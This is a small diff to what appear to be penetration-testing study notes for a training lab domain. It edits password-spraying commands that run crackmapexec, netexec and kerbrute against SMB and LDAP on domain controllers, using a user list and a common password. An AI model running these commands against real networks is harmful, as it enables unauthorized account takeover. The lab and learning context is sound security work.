@@ -299,9 +299,9 @@ kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  W
 ```
 - crackMapExec  / netexec (against smb or ldap)
 ```shell
-sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +
+sudo crackmapexec smb 172.16.5.5-10 -u valid_users.txt -p Password123 | grep +
 
-sudo netexec ldap -u valid_users.txt  -p Password123 
+sudo netexec 172.16.5.5-10 ldap -u valid_users.txt  -p Password123 
 ```
 
 ```shell
